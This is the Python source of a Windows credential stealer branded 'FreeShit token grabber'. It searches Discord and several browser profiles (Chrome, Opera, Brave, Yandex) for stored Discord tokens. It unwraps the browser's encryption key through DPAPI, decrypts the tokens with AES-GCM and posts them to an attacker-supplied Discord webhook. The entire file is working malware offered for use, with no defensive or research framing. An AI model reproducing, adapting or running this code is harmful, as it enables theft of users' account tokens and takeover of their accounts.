import os, re, json, base64, win32crypt,colorama
from colorama import init
from requests import post
from cryptography.hazmat.primitives.ciphers import aead
roaming = os.getenv('APPDATA')
local = os.getenv('LOCALAPPDATA')

init()

os.system("title Token Grabber Created by getfreeshit.today")

banner = f"""
{colorama.Fore.RED}███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
{colorama.Fore.GREEN}██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
{colorama.Fore.RED}█████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
{colorama.Fore.GREEN}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
{colorama.Fore.RED}██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
{colorama.Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝ 
{colorama.Fore.RED}Created By FreeShit ║ Dev: Chargonium#8203 ║ getfreeshit.today
{colorama.Fore.GREEN}
"""

print(banner)

WEBHOOK = "<WEBHOOK_HERE>"
tokensFound = {}

def decrypt(encryptedFull: str, key: str):
    encryptedFull = base64.b64decode(encryptedFull)
    iv = encryptedFull[3:15] 
    Aencrypted = encryptedFull[15:] 

    DecryptedKey = base64.b64decode(key)[5:]
    DecryptedKey = win32crypt.CryptUnprotectData(DecryptedKey)[1]

    cipher = aead.AESGCM(DecryptedKey)
    Output = cipher.decrypt(iv, Aencrypted, None)

    return Output

def grab_tokens(path):
    try:
        tokens = []
        path += "\\Local Storage\\leveldb"
        os.chdir(path)
        for filename in os.listdir():
            if filename.endswith('.log') or filename.endswith('.ldb'):
                with open(filename, "rb") as file:
                    for line in file.readlines():
                        for match in re.findall(b"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"\"]*", line):
                            Matches.append(match)
        os.chdir("..\\..\\")
        with open("Local State", "r") as file:
            key = json.load(file).get("os_crypt", {"encrypted_key": None}).get("encrypted_key")
            if key == None:
                raise Exception("Could not find the key!")

        for match in Matches:
            match = match.decode("utf-8")
            match: str
            tokens.append(decrypt(match.removeprefix("dQw4w9WgXcQ:"), key).decode('ascii'))

        return tokens
    except:
        return [None]

paths = {
    'Discord': roaming + '\\discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

for platform, path in paths.items():
    Matches = []
    print(path)
    if os.path.exists(path):
        DecryptedTokens = grab_tokens(path)
    else:
        DecryptedTokens = [None]
    tokensFound[platform] = DecryptedTokens

Message = "FreeShit token grabber\ngetfreeshit.today\n"
for platform, FoundTokens in tokensFound.items():
    ListedTokens = []
    if not FoundTokens[0] == None:
        Message += f"**Tokens Found in {platform}**\n```\n"
        print(f"{platform}:{FoundTokens}")
        for token in FoundTokens:
            if ListedTokens.count(token) == 0:
                Message += f"{token}\n"
                ListedTokens.append(token)
        Message += "```\n"

PAYLOAD = {
    "content": Message
}

post(WEBHOOK, PAYLOAD)
